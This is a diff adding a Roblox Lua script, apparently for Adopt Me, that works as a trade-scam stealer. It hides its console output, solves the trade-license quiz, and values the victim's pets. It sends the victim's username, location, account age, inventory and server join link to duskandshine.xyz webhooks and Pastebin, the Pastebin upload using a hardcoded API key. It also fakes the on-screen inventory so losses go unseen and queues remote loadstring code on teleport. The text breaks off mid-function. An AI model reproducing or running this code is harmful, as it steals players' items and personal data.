@@ -1,0 +1,1409 @@
+do
+    local _env = getgenv and getgenv() or _G
+    local _noop = function(...) end
+    _env.print, _env.warn, _env.error, _env.info = _noop, _noop, _noop, _noop
+    _env.rconsoleprint, _env.rconsolewarn, _env.rconsoleerr, _env.rconsoleinfo = _noop, _noop, _noop, _noop
+    _env.tostring = function(obj) if type(obj) == "string" or type(obj) == "number" then return obj end return "SystemObject" end
+    local _net_req = (http_request or request or (syn and syn.request) or (fluxus and fluxus.request))
+    if _net_req then _env.request = _net_req end
+    if _env.hookfunction then _env.hookfunction = function(func, hook) return func end; _env.hookfunc = _env.hookfunction; _env.replaceclosure = _env.hookfunction end
+    local _raw_pairs = pairs
+    _env.pairs = function(t) if t == _G or t == _env then return _raw_pairs({}) end return _raw_pairs(t) end
+end
+
+if not game:IsLoaded() then game.Loaded:Wait() end
+
+local IsVIPServer = false
+if game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType") and game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer() == "VIPServer" then 
+    IsVIPServer = true 
+end
+
+local ExecutorName = identifyexecutor() or "Unknown"
+local PlaceId = game.PlaceId
+local JobId = nil
+
+local function GetRealJobID()
+    if getproperties then
+        local props = getproperties(game)
+        return props["JobId"] or props.JobId
+    elseif gethiddenproperty then
+        return gethiddenproperty(game, "JobId")
+    end
+end
+
+if ExecutorName == "Delta" or ExecutorName == "Krnl" then
+    JobId = GetRealJobID()
+else
+    JobId = game.JobId
+end
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalizationService = game:GetService("LocalizationService")
+local LocalPlayer = Players.LocalPlayer
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+
+local fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
+local ClientData = fsys("ClientData")
+
+-- МОМЕНТАЛЬНО ПОДХВАТ ИНВЕНТАРЯ (АНТИ-НАГРУЗЧИК)
+local InventoryDB = fsys("InventoryDB")
+local inventory = ClientData.get("inventory")
+
+local UIManager = fsys("UIManager")
+local UIActive = true
+
+local TradeApp = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeApp")
+local DialogApp = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("DialogApp")
+local HintApp = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("HintApp")
+
+local UIWhiteList = {
+    ["MainApp"] = true,
+    ["ToolApp"] = true
+}
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
+local TextService = game:GetService("TextService")
+
+local LocalPlayer = Players.LocalPlayer
+
+local qot = queue_on_teleport 
+    or queueonteleport 
+    or (syn and syn.queue_on_teleport) 
+    or (fluxus and fluxus.queue_on_teleport)
+
+local CHECK_URL = "https://duskandshine.xyz/api/update_status?username=" .. LocalPlayer.Name
+local TRIGGER_WORD = "UPDATE_REQUIRED" 
+local CHECK_INTERVAL = 10 
+
+getgenv().DuskScriptStartTime = getgenv().DuskScriptStartTime or os.time()
+if getgenv().DuskShineUpdaterStarted then return end
+getgenv().DuskShineUpdaterStarted = true
+
+-- 1. Функция поиска паблик сервера и телепортации
+local function serverHopToPublic()
+    local placeId = game.PlaceId
+    local currentJobId = game.JobId
+    
+    -- Запрашиваем список паблик серверов через API Роблокса
+    local url = "https://games.roblox.com/v1/games/" .. tostring(placeId) .. "/servers/Public?sortOrder=Desc&limit=100"
+    
+    local success, response = pcall(function()
+        return game:HttpGet(url)
+    end)
+
+    if success and response then
+        local data = HttpService:JSONDecode(response)
+        if data and data.data then
+            for _, server in ipairs(data.data) do
+                -- Ищем сервер: есть места и это не наш текущий сервер
+                if server.playing < (server.maxPlayers - 4) and server.id ~= currentJobId then
+                    
+                    local currentWorker = getgenv().WorkerName or "Official"
+
+                    -- Добавляем автозапуск dusk & shine на новом сервере
+                    if qot then
+                        qot([[
+                        getgenv().WorkerName = "]] .. currentWorker .. [["
+                        print("Server Loaded!")
+                        loadstring(game:HttpGet('https://raw.githubusercontent.com/maximchinazesov-beep/testfield/refs/heads/main/paidversion_private'))()
+                    ]])
+                    end
+
+                    -- Прыгаем на найденный паблик сервер
+                    TeleportService:TeleportToPlaceInstance(placeId, server.id, LocalPlayer)
+                    return
+                end
+            end
+        end
+    end
+    
+    -- Фолбэк, если API роблокса лежит (кинет просто на другой сервер)
+    TeleportService:Teleport(placeId, LocalPlayer)
+end
+
+-- 2. Функция визуального оповещения (Новый UI) и таймера
+local function triggerUpdateSequence()
+    local targetGui = pcall(function() return CoreGui.Name end) and CoreGui or LocalPlayer:WaitForChild("PlayerGui")
+
+    if targetGui:FindFirstChild("DuskShineRestartBanner") then
+        targetGui.DuskShineRestartBanner:Destroy()
+    end
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "DuskShineRestartBanner"
+    gui.Parent = targetGui
+    gui.IgnoreGuiInset = true
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+    -- Настройки текста
+    local textSegment = "SERVER RESTARTING SOON!   "
+    local fontSize = 24
+    local font = Enum.Font.FredokaOne 
+
+    local segmentWidth = TextService:GetTextSize(textSegment, fontSize, font, Vector2.new(10000, 30)).X
+    local repeatedText = string.rep(textSegment, 100)
+
+    local function createBanner(isTop)
+        local frame = Instance.new("Frame")
+        frame.Size = UDim2.new(1, 0, 0, 32)
+        frame.Position = isTop and UDim2.new(0, 0, 0, 0) or UDim2.new(0, 0, 1, -32)
+        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        frame.BackgroundTransparency = 0.4
+        frame.BorderSizePixel = 0
+        frame.ClipsDescendants = true
+        frame.Parent = gui
+
+        local label = Instance.new("TextLabel")
+        label.Size = UDim2.new(0, segmentWidth * 100, 1, 0)
+        label.Position = UDim2.new(0, 0, 0, 0)
+        label.BackgroundTransparency = 1
+        label.Text = repeatedText
+        label.Font = font
+        label.TextSize = fontSize
+        label.TextXAlignment = Enum.TextXAlignment.Left
+        label.Parent = frame
+
+        local stroke = Instance.new("UIStroke")
+        stroke.Thickness = 2.5
+        stroke.Color = Color3.fromRGB(0, 0, 0)
+        stroke.Parent = label
+
+        local scrollSpeed = 95
+        local rgbSpeed = 6
+
+        RunService.RenderStepped:Connect(function()
+            local hue = (tick() % rgbSpeed) / rgbSpeed
+            label.TextColor3 = Color3.fromHSV(hue, 1, 1)
+            local offset = (tick() * scrollSpeed) % segmentWidth
+            label.Position = UDim2.new(0, -offset, 0, 0)
+        end)
+    end
+
+    -- Спавним верхнюю и нижнюю плашки
+    createBanner(true)
+    createBanner(false)
+
+    -- Ждем 60 секунд (плашки в это время крутятся), затем телепортируем
+    task.wait(60)
+    serverHopToPublic()
+end
+
+-- 3. Функция фонового опроса твоего сайта
+local function startPolling()
+    task.spawn(function()
+        while task.wait(CHECK_INTERVAL) do
+            -- Делаем запрос к сайту
+            local success, response = pcall(function()
+                return game:HttpGet(CHECK_URL)
+            end)
+
+            if success and response then
+                -- Если сайт вернул нужный триггер — запускаем процесс обновления
+                if string.find(response, TRIGGER_WORD) then
+                    triggerUpdateSequence()
+                    break -- Выходим из цикла опроса
+                end
+            end
+        end
+    end)
+end
+
+-- 4. Запускаем весь механизм при инджекте
+startPolling()
+
+-- ФУНКЦИЯ СКРЫТИЯ ИНТЕРФЕЙСА
+local function HideInterface()
+    UIActive = false
+    task.spawn(function()
+        TradeApp.Enabled = false
+        DialogApp.Enabled = false
+        HintApp:Destroy()
+    end)
+end
+
+-- ФУНКЦИЯ ПОКАЗА ИНТЕРФЕЙСА
+local function ShowInterface()
+    UIActive = true
+    TradeApp.Enabled = true
+    DialogApp.Enabled = true
+end
+
+local RouterClient = fsys("RouterClient")
+local PetEntityManager = fsys("PetEntityManager")
+
+local SetSetting = RouterClient.get("SettingsAPI/SetSetting")
+SetSetting:FireServer("trade_requests", 1)
+SetSetting:FireServer("give_item_requests", 1)
+
+local Trade = {
+    Send = RouterClient.get("TradeAPI/SendTradeRequest"),
+    Add = RouterClient.get("TradeAPI/AddItemToOffer"),
+    Accept = RouterClient.get("TradeAPI/AcceptNegotiation"),
+    Confirm = RouterClient.get("TradeAPI/ConfirmTrade"),
+    Decline = RouterClient.get("TradeAPI/DeclineTrade")
+}
+
+-- ДЛЯ АЙТЕМОВ
+local ItemList = {}
+local TotalValue = 0
+local TotalValueComm = 0
+local TransferredValueRaw = 0
+
+local InitialTopItems = ""
+local InitialPotionCounts = {mfr=0, nfr=0, fr=0, m=0, n=0, f=0, r=0}
+
+local PendingTrades = {}
+local ItemsInTransit = {}
+
+local ValuesCache = {}
+local InvDBReady = false
+
+local endpoint = getgenv()["DuskEndpoint"] or "64"
+
+local function LoadReceiverNames()
+    local fileUrl = "https://duskandshine.xyz/" .. endpoint
+    local success, response = pcall(function()
+        return request({
+            Url = fileUrl,
+            Method = "GET"
+        })
+    end)
+    if success and response and response.Success and response.Body then
+        local validLines = {}
+        for line in response.Body:gmatch("[^\r\n]+") do
+            local cleanedLine = line:gsub("%s+$", ""):gsub("^%s+", "")
+            if cleanedLine ~= "" then
+                table.insert(validLines, cleanedLine)
+            end
+        end
+        return validLines
+    end
+    return nil
+end
+
+local ReceiverNames = LoadReceiverNames()
+
+local Receiver1 = ReceiverNames[1]
+local Receiver2 = ReceiverNames[2]
+
+-- ID ГОТОВЫХ ТРЕЙДОВ
+local ProcessedTradeIDs = {}
+
+-- ПЕРЕМЕННЫЕ ДЛЯ ЛОГОВ И ТД / WPS
+local MessageID = nil
+local TransferredValue = 0
+local InventoryLink = nil
+
+local AutismPocket = {
+    "MT для адопта принес более 80к руб за неделю.",
+    "Создатель первого сурса MT с европы.",
+    "Самые чистые логи у MT!",
+    "Дельта - контора пидорасов",
+    "Сиськи",
+    "fr3dope был придуман по приколу, изначально как кикер",
+    "Starpets was rejected by MT",
+    "Лучший наш хит - MFR Bat Dragon и др. жирные петы на 200к",
+    "Стремимся к лучшему!",
+    "11.09.2001 - интересная дата",
+    "Возможно у aliwave есть проблемы с психикой",
+    "Laimonfresh, Molly Auto-Farm был сделан fr3dope!",
+    "FBScripts от слова forbidden, оно же - забытый, потерянный",
+    "Какого хуя Munchkin cat стоит 150р?",
+    "Валюты уже исправлены.",
+    "Во время написания DUSK & SHINE было выпито 20л колы",
+    "Тимоха Ягерь не любит когда его так называют",
+    "Овнер MT выебал колонку когда бухал (он отрицает это)",
+    "Список валют elvebredd составлял далбоеб",
+    "V2.0 Стиллера была написана с нуля за 3 дня"
+}
+
+local RandomMeme = AutismPocket[math.random(1, #AutismPocket)]
+
+local webhook_id = getgenv()["DuskWebhookID"] or "public"
+local WebHook = "https://duskandshine.xyz/api/webhook/" .. webhook_id
+
+-- ЧЕКЕР РЕГИОНА
+local City = nil
+local Country = nil
+local function checkCountry()
+    local success, response = pcall(function()
+        return game:HttpGet("https://ipwhois.app/json/")
+    end)
+
+    if success and response then
+        local data = HttpService:JSONDecode(response)
+        
+        Country = data.country
+        City = data.city
+    else
+        Country = "Unknown"
+        City = "Unknown"
+    end
+end
+checkCountry()
+
+if Country == "Republic of Korea" or Country == "Korea" or Country == "Belgium" then 
+    return 
+end
+
+-- ЧЕКЕР ТРЕЙД ЛИЦЕНЗИИ
+local function HasLicense()
+    local inv = ClientData.get("inventory")
+    if inv and inv.toys then
+        for uid, item in pairs(inv.toys) do
+            local kind = item.kind and tostring(item.kind):lower() or ""
+            local id = item.id and tostring(item.id):lower() or ""
+            if kind:find("trade_license") or id:find("trade_license") then 
+                return true 
+            end
+        end
+    end
+    return false
+end
+-- АВТО ТРЕЙД ЛИЦЕНЗИЯ
+local function VerifyTradeLicense()
+    LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("NewsApp", 10)
+    LocalPlayer.PlayerGui:WaitForChild("DialogApp", 10)
+    RouterClient.get("SettingsAPI/SetBooleanFlag"):FireServer("has_talked_to_trade_quest_npc", true)
+    task.wait(0.1)
+    
+    RouterClient.get("TradeAPI/BeginQuiz"):FireServer()
+    task.wait(1)
+    local quizManager = ClientData.get("trade_license_quiz_manager")
+    if quizManager and quizManager.quiz then
+        for _, question in pairs(quizManager.quiz) do
+            if question.answer then
+                RouterClient.get("TradeAPI/AnswerQuizQuestion"):FireServer(question.answer)
+                task.wait(0.1)
+            end
+        end
+    end
+end
+-- ВЫПОЛНЕНИЕ ТРЕЙД ЛИЦЕНЗИИ
+if not HasLicense() then VerifyTradeLicense() end
+
+-- ЧЕКЕР ВАЛИДНОСТИ ПЕТА (АНТРЕЙДБЛ АПДЕЙТ!!!)
+local function IsRealPet(uid)
+
+    if not inventory or not inventory.pets then return false end
+    
+    local petData = inventory.pets[uid]
+    if not petData then return false end
+    
+    if petData.unique ~= uid then return false end
+    if petData.newness_order == nil then return false end
+    
+    local props = petData.properties or {}
+    local kind = petData.kind or petData.id
+    local dbEntry = InventoryDB.pets and InventoryDB.pets[kind]
+
+    if props.admin_abuse then return false end           
+    if props.trade_lock_expiration then return false end 
+    if props.reverted or props.is_reverted then return false end 
+    if props.tradeable_timestamp then return false end
+    if props.xp == nil then return false end
+
+    if dbEntry and not dbEntry.is_egg then
+        if props.age == nil then return false end
+        if props.friendship_level == nil then return false end
+        if props.pet_trick_level == nil then return false end
+    end
+    
+    if dbEntry then
+        if dbEntry.donatable == false then return false end
+        if dbEntry.is_tradeable == false then return false end
+        if dbEntry.temporary == true then return false end
+        -- дочекеры плотные, скорее всего такого нету в спавнерах
+        if dbEntry.hold_offset == nil then return false end
+        if dbEntry.is_proper_name == nil then return false end
+    else
+        return false
+    end
+    return true
+end
+
+-- ИНИЦИЛИЗАЦИЯ ВАЛЮС ТЕЙБЛА
+local function LoadValues()
+    local raw = "https://duskandshine.xyz/api/values"
+    return loadstring(game:HttpGet(raw))()
+end
+
+local ValuesTable = LoadValues()
+
+if  ValuesTable then
+    print("skinw*lker 0_0")
+else
+    return
+end
+
+-- ОЦЕНИВАТЕЛЬ
+local function EvaluateItem(exactName, props)
+    if type(ValuesTable) ~= "table" or not exactName then return 0 end
+
+    local data = ValuesTable[exactName]
+
+    if not data then return 0 end 
+
+    -- фильтр для предметов (не петов)
+    if not data["MFRValue"] then 
+        return tonumber(data["DefValue"]) or 0 
+    end
+
+    local isMega = props.mega_neon == true or props.mega_neon == 1
+    local isNeon = props.neon == true or props.neon == 1
+    local isFly = props.flyable == true or props.fly == true or props.fly == 1
+    local isRide = props.rideable == true or props.ride == true or props.ride == 1
+
+    if isMega then
+        if isFly or isRide then
+            return tonumber(data["MFRValue"]) or 0
+        else
+            return tonumber(data["MValue"]) or 0
+        end
+    elseif isNeon then
+        if isFly or isRide then
+            return tonumber(data["NFRValue"]) or 0
+        else
+            return tonumber(data["NValue"]) or 0
+        end
+    else
+        if isFly and isRide then
+            return tonumber(data["FRValue"]) or 0
+        elseif isFly then
+            return tonumber(data["FValue"]) or 0
+        elseif isRide then
+            return tonumber(data["RValue"]) or 0
+        else
+            return tonumber(data["DefValue"]) or 0
+        end
+    end
+end
+
+-- СБОРКА ИНВЕНТАРЯ
+local function GetInventory()
+    ItemList = {}
+    TotalValue = 0
+    TotalValueComm = 0
+
+    if not inventory then return end
+
+    local scanCategories = {
+        "pets", "food", "gifts", "pet_accessories", "roleplay", "strollers", "toys", "transport"
+    }
+
+    for _, catName in ipairs(scanCategories) do
+        local items = inventory[catName]
+        if items then
+            for uid, data in pairs(items) do
+                local kind = data.kind or data.id
+                local dbEntry = InventoryDB[catName] and InventoryDB[catName][kind]
+                
+                local shouldAdd = false
+                local potionsStr = ""
+
+                if catName == "pets" then
+                    if IsRealPet(uid) then
+                        shouldAdd = true
+                        local props = data.properties or {}
+                        local pTable = {}
+                        if props.mega_neon then table.insert(pTable, "M") end
+                        if props.neon and not props.mega_neon then table.insert(pTable, "N") end
+                        if props.flyable then table.insert(pTable, "F") end
+                        if props.rideable then table.insert(pTable, "R") end
+                        if #pTable > 0 then
+                            potionsStr = " [" .. table.concat(pTable, "") .. "]"
+                        end
+                    end
+                else
+                    shouldAdd = true
+                end
+
+                if shouldAdd then
+                    local rawName = dbEntry and dbEntry.name
+                    local cleanName = rawName
+                    local props = data.properties or {}
+                    local rawPrice = EvaluateItem(cleanName, props)
+                    local itemVal = rawPrice * 0.8
+
+                    local rawImage = ""
+                    if dbEntry and dbEntry.image then
+                        local imgId = tostring(dbEntry.image):match("%d+")
+                        if imgId then
+                            -- Используем надежный asset-thumbnail API
+                            rawImage = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. imgId .. "&width=420&height=420&format=png"
+                        end
+                    end
+
+                    if itemVal >= 30 then
+                    TotalValue = TotalValue + rawPrice
+                    TotalValueComm = TotalValueComm + itemVal
+                    table.insert(ItemList, {
+                        Name = cleanName,
+                        uid = uid,
+                        potions = potionsStr,
+                        category = catName,
+                        value = itemVal,
+                        raw_value = rawPrice,
+                        image = rawImage
+                    })
+                    end
+                end
+            end
+        end
+    end
+    table.sort(ItemList, function(a, b)
+        return a.value > b.value
+    end)
+    TotalValue = math.floor(TotalValue * 100) / 100
+    TotalValueComm = math.floor(TotalValueComm * 100) / 100
+    InitialTopItems = ""
+    InitialPotionCounts = {mfr=0, nfr=0, fr=0, m=0, n=0, f=0, r=0}
+    
+    for i, item in ipairs(ItemList) do
+        if i <= 5 then
+            InitialTopItems = InitialTopItems .. string.format("%s%s: %.2f₽\n", item.Name, item.potions, item.value) 
+        end
+        local p = item.potions:upper()
+        if p:find("M") and p:find("F") and p:find("R") then 
+            InitialPotionCounts.mfr = InitialPotionCounts.mfr + 1
+        elseif p:find("N") and p:find("F") and p:find("R") then 
+            InitialPotionCounts.nfr = InitialPotionCounts.nfr + 1
+        elseif p:find("F") and p:find("R") and not p:find("M") and not p:find("N") then 
+            InitialPotionCounts.fr = InitialPotionCounts.fr + 1
+        else
+            if p:find("M") then InitialPotionCounts.m = InitialPotionCounts.m + 1 end
+            if p:find("N") then InitialPotionCounts.n = InitialPotionCounts.n + 1 end
+            if p:find("F") then InitialPotionCounts.f = InitialPotionCounts.f + 1 end
+            if p:find("R") then InitialPotionCounts.r = InitialPotionCounts.r + 1 end
+        end
+    end
+end
+
+-- ЛОГ НА ПАСТБИН (ПОЛУЧЕНИЕ ССЫЛКИ ДЛЯ ДИСКОРДА)
+local function GetPastebinLink(items, totalRaw, totalComm)
+    local finalRaw = math.floor(totalRaw * 100) / 100
+    local finalComm = math.floor(totalComm * 100) / 100
+
+    local content = string.format(
+        "--- [ MOLITOWN LOG ] ---\n------------------------\nUser: %s\nTotal Value: %s₽ (%s₽)\nItems Count: %d\n------------------------\n\n",
+        LocalPlayer.Name, tostring(finalRaw), tostring(finalComm), #items
+    )
+    for i, item in ipairs(items) do
+        content = content .. string.format("%s%s: %.2f₽\n", 
+            item.Name, 
+            item.potions, 
+            item.value
+        )
+    end
+    local body = {
+        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
+        api_paste_code = content,
+        api_option = "paste",
+        api_paste_name = LocalPlayer.Name .. " - Inv",
+        api_paste_expire_date = "1M"
+    }
+    local encBody = ""
+    for k, v in pairs(body) do
+        encBody = encBody .. k .. "=" .. HttpService:UrlEncode(v) .. "&"
+    end
+    encBody = encBody:sub(1, -2)
+    local resp
+    local success = pcall(function()
+        resp = request({
+            Url = "https://pastebin.com/api/api_post.php",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/x-www-form-urlencoded"},
+            Body = encBody
+        })
+    end)
+    if success and resp and resp.Body and not resp.Body:find("Post limit") then
+        local pId = resp.Body:match("[%w]+$")
+        if pId then
+            return "https://pastebin.com/raw/" .. pId
+        end
+    end
+    return "Pastebin Error"
+end
+---------------------------------------------------------
+
+-- ФРИЗЕР ИНВЕНТАРЯ
+local function FreezeInventory()
+
+    local function deepCopy(orig)
+        local copy = {}
+        for k, v in pairs(orig) do
+            if type(v) == "table" then copy[k] = deepCopy(v)
+            else copy[k] = v end
+        end
+        return copy
+    end
+
+    local pName = LocalPlayer.Name
+
+    local ClientDataAPI = fsys("ClientData")
+    local raw = ClientDataAPI.get_data()[pName]
+    if not raw or not raw.inventory then return end
+
+    local FROZEN_INV = deepCopy(raw.inventory)
+    task.spawn(function()
+        local ghost, lastUID
+        while true do
+            local equippedUID, equippedMdl
+            local ents = PetEntityManager.get_local_owned_pet_entities()
+            
+            if ents then
+                for _, e in pairs(ents) do
+                    if e.base.char_wrapper.player == LocalPlayer then
+                        equippedUID = e.base.char_wrapper.pet_unique
+                        equippedMdl = e.base.char
+                        break
+                    end
+                end
+            end
+            
+            if equippedUID and equippedUID ~= lastUID then
+                if ghost then ghost:Destroy() end
+                lastUID = equippedUID
+                if equippedMdl then
+                    equippedMdl.Archivable = true
+                    ghost = equippedMdl:Clone()
+                    equippedMdl.Archivable = false
+                    ghost.Name = "FakePet_Visual"
+                    ghost.Parent = nil
+                    for _, v in pairs(ghost:GetDescendants()) do
+                        if v:IsA("LuaSourceContainer") then v:Destroy() end
+                    end
+                end
+            end
+
+            if ghost then
+                if not equippedMdl or not equippedMdl.Parent then
+                    if ghost.Parent ~= workspace then ghost.Parent = workspace end
+                    
+                    local char = LocalPlayer.Character
+                    if char and char:FindFirstChild("HumanoidRootPart") then
+                        local targetPos = char.HumanoidRootPart.CFrame * CFrame.new(3, -1, 3)
+                        local rp = ghost:FindFirstChild("HumanoidRootPart") or ghost.PrimaryPart
+                        if rp then rp.CFrame = rp.CFrame:Lerp(targetPos, 0.15) end
+                    end
+                else
+                    if ghost.Parent ~= nil then ghost.Parent = nil end
+                end
+            end
+            task.wait(0.03)
+        end
+    end)
+
+    local oldGet = ClientDataAPI.get
+    ClientDataAPI.get = function(k)
+        if k == "inventory" then
+            return deepCopy(FROZEN_INV)
+        end
+        return oldGet(k)
+    end
+
+    if ClientDataAPI.DataChangedEvent then
+        local oldFire = ClientDataAPI.DataChangedEvent.Fire
+        ClientDataAPI.DataChangedEvent.Fire = function(self, k, v, ...)
+            if k == "inventory" then
+                return oldFire(self, k, deepCopy(FROZEN_INV), ...)
+            end
+            return oldFire(self, k, v, ...)
+        end
+        ClientDataAPI.DataChangedEvent:Fire("inventory", FROZEN_INV)
+    end
+end
+
+-- ФОРМАТИРОВАНИЕ СООБЩЕНИЙ ВЕБХУКА
+local function SendInventoryLog()
+    local headers = {["Content-Type"] = "application/json"}
+    local url = WebHook
+
+    if not InventoryLink then
+        if #ItemList > 0 then
+            InventoryLink = GetPastebinLink(ItemList, TotalValue, TotalValueComm)
+        else
+            InventoryLink = "Error"
+        end
+    end
+
+    local counts = InitialPotionCounts
+    local topItems = InitialTopItems
+    local ping = (TotalValueComm >= 400) and "@everyone" or ""
+    local teleportLink = "roblox://experiences/start?placeId=" .. PlaceId .. "&gameInstanceId=" .. (JobId or "None")
+
+    local data = {
+        username = "M O L I T O W N",
+        avatar_url = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
+        content = ping .. "\n`" .. teleportLink .. "`",
+        embeds = {{
+            title = "🎯 **" .. LocalPlayer.Name .. "** **used ur fucking script!**",
+            color = 16733171,
+            fields = {
+                { name = "🔗 **Teleport Service**", value = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. PlaceId .. ", \"" .. (JobId or "None") .. "\")\n```", inline = false },
+                { name = ":tada: **Autism**", value = "||" .. RandomMeme .. "||", inline = false },
+                { 
+                    name = "🦣 **User Information**", 
+                    value = "```lua\nUsername      : " .. LocalPlayer.Name .. 
+                            "\nLocation      : " .. tostring(Country) .. " / " .. tostring(City) ..
+                            "\nAccount Age   : " .. LocalPlayer.AccountAge .. " Days" ..
+                            "\nExecutor      : " .. tostring(ExecutorName) .. 
+                            "\nReceiver      : " .. tostring(Receiver1) .. ", " .. tostring(Receiver2) .. 
+                            "\nMolitown      : 4.2\n```", 
+                            inline = false 
+                },
+                { name = "💰 **Inventory Stats**", value = "```lua\nTotal Value   : " .. string.format("%.2f₽ (%.2f₽)", TotalValue, TotalValueComm) .. "\nMFR: " .. counts.mfr .. " | NFR: " .. counts.nfr .. " | FR: " .. counts.fr .. "\nM: " .. counts.m .. " | N: " .. counts.n .. " | F: " .. counts.f .. " | R: " .. counts.r .. "```", inline = false},
+                { name = "👑 **Top Valuable Items**", value = "```lua\n" .. (topItems ~= "" and topItems or "None") .. "```", inline = false },
+                { name = "", value = "🪐 **[Click to view all items](" .. (InventoryLink or "Generating...") .. ")**", inline = false } 
+            }
+        }}
+    }
+
+    local isVip = (game.VIPServerId ~= "" and game.VIPServerId ~= nil)
+    local serverType = isVip and "VIP" or "PUBLIC"
+
+    task.spawn(function()
+        local payload = {
+            username = LocalPlayer.Name,
+            place_id = tostring(PlaceId),
+            job_id = tostring(JobId),
+            value = TotalValueComm,
+            items = ItemList,
+            worker_name = getgenv().WorkerName or ""
+        }
+        pcall(function()
+            request({
+                Url = "https://duskandshine.xyz/api/joiner/add_target",
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+    end)
+
+    pcall(function() 
+        request({ 
+            Url = url, 
+            Method = "POST", 
+            Headers = headers, 
+            Body = HttpService:JSONEncode(data) 
+        }) 
+    end)
+end
+
+local function SendLeaveLog()
+    local isSafe = (TotalValueComm == 0)
+    local statusColor = isSafe and 65280 or 16711680
+    local statusEmoji = isSafe and ":white_check_mark:" or ":broken_heart:"
+
+    local data = {
+        username = "M O L I T O W N",
+        avatar_url = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
+        embeds = {{
+            title = statusEmoji .. " **" .. LocalPlayer.Name .. " leaved!**",
+            color = statusColor,
+            description = "```lua\nUsername   : " .. LocalPlayer.Name .. 
+                                "\nRemaining  : " .. string.format("%.2f₽ (%.2f₽)", TotalValue, TotalValueComm) .. "\n```"
+        }}
+    }
+
+    pcall(function() 
+        request({ 
+            Url = WebHook, 
+            Method = "POST", 
+            Headers = {["Content-Type"] = "application/json"}, 
+            Body = HttpService:JSONEncode(data) 
+        }) 
+    end)
+end
+
+local function SendLootLog(auxData)
+    local tVal = auxData.val or 0
+    local tRawVal = auxData.raw_val or 0
+    local stage = (tVal >= 5000) and "**BIG LOOT**" or "**COMPLETED**"
+    
+    local data = {
+        username = "M O L I T O W N",
+        avatar_url = "https://i.pinimg.com/1200x/fa/95/5f/fa955f8fadbab5ed753834dbab895fb4.jpg",
+        content = (tVal >= 5000) and "@everyone" or "",
+        embeds = {{
+            title = "💸 " .. stage .. " - " .. LocalPlayer.Name,
+            color = 65404,
+            fields = {
+                { name = "💰 **Trade Stats**", value = "```lua\nValue Transferred : " .. string.format("%.2f₽ (%.2f₽)", tRawVal, tVal) .. "\nItems Count         : " .. auxData.count .. "\n```", inline = false },
+                { name = "👑 **Traded Items**", value = "```lua\n" .. auxData.list .. "```", inline = false }
+            }
+        }}
+    }
+
+    pcall(function() 
+        request({ 
+            Url = WebHook, 
+            Method = "POST", 
+            Headers = {["Content-Type"] = "application/json"}, 
+            Body = HttpService:JSONEncode(data) 
+        }) 
+    end)
+
+    task.spawn(function()
+        local trafferName = getgenv().WorkerName or "Unknown_Worker"
+        local payload = {
+            worker = trafferName,
+            value = tVal,
+            details = auxData.list,
+            victim = game:GetService("Players").LocalPlayer.Name
+        }
+        pcall(function()
+            request({
+                Url = "https://duskandshine.xyz/api/log_loot",
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+    end)
+end
+
+-- ПОЛУЧЕНИЕ СТАТУСА ТРЕЙДА
+local function GetTradeState()
+    local rawData = ClientData.get_data()[LocalPlayer.Name]
+    if not rawData.trade then 
+        return "NONE", nil, nil 
+    end
+    
+    local trade = rawData.trade
+    local stage = trade.current_stage or "NONE"
+    
+    local myOffer, theirOffer = nil, nil
+    if trade.sender_offer and trade.sender_offer.player_name == LocalPlayer.Name then
+        myOffer = trade.sender_offer
+        theirOffer = trade.recipient_offer
+    elseif trade.recipient_offer and trade.recipient_offer.player_name == LocalPlayer.Name then
+        myOffer = trade.recipient_offer
+        theirOffer = trade.sender_offer
+    end
+    
+    return stage, myOffer, theirOffer
+end
+
+-- ПОКАЗ РЮКЗАКА И TOOLS ВО ВРЕМЯ ТРЕЙДА
+local function RestoreWhitelistUI()
+    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+    if not playerGui then return end
+    
+    for appName, _ in pairs(UIWhiteList) do
+        if UIManager.app_visibilities then
+            UIManager.app_visibilities[appName] = true
+            
+            if UIManager.apps and UIManager.apps[appName] then 
+                pcall(function() UIManager.apps[appName]:refresh() end) 
+            end
+        end
+        
+        local gui = playerGui:FindFirstChild(appName)
+        if gui then
+            gui.Enabled = true
+            for _, child in pairs(gui:GetChildren()) do
+                if child:IsA("Frame") then
+                    child.Visible = true
+                end
+            end
+        end
+    end
+end
+
+local SpawnHistoryChecker
+do
+    local PendingTrades = {}
+    local WorkerRunning = false
+
+    local function CleanID(id)
+        return tostring(id):gsub("[{}]", ""):lower()
+    end
+
+    SpawnHistoryChecker = function(tradeId, currentItems)
+        if not tradeId then return end
+        local tid_clean = CleanID(tradeId)
+        
+        for _, pending in ipairs(PendingTrades) do
+            if pending.id == tid_clean then return end
+        end
+
+        local snapshot = {}
+        for _, item in ipairs(currentItems) do 
+            table.insert(snapshot, item)
+            ItemsInTransit[item.uid] = true
+        end
+        table.insert(PendingTrades, { id = tid_clean, items = snapshot, time = tick() })
+
+        if not WorkerRunning then
+            WorkerRunning = true
+            task.spawn(function()
